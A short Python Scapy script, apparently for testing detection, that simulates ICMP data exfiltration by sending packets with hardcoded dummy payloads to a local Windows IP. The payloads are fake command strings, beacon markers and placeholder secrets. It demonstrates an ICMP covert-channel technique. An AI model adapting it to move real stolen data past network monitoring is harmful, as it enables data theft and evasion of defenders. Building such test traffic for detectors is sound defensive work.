#!/usr/bin/env python3
from scapy.all import *
import time

# Your Windows IP
target = "192.168.0.107" # Replace with actual target IP

# Simulate different types of encoded data
payloads = [
    "TEST-COMMAND-STRING-12345",
    "CMD:whoami",
    "CMD:net user",
    "CMD:ipconfig /all",
    "DATA:exfiltrated-content-here",
    "BEACON:heartbeat-001",
    "password=SuperSecret123",
    "API_KEY=a1b2c3d4-e5f6-7890",
    "CREDIT_CARD=4111-1111-1111-1111",
    "SSN=123-45-6789"
]

print(f"[*] Starting ICMP data exfiltration simulation")
print(f"[*] Target: {target}")
print(f"[*] Sending {len(payloads)} packets with encoded data\n")

for i, payload in enumerate(payloads, 1):
    # Create packet with payload
    pkt = IP(dst=target)/ICMP()/Raw(load=payload)
    
    # Send packet
    send(pkt, verbose=False)
    
    print(f"[{i:2d}] Sent: {payload} ({len(payload)} bytes)")
    time.sleep(0.5)

print(f"\n[*] Done! Sent all {len(payloads)} packets.")
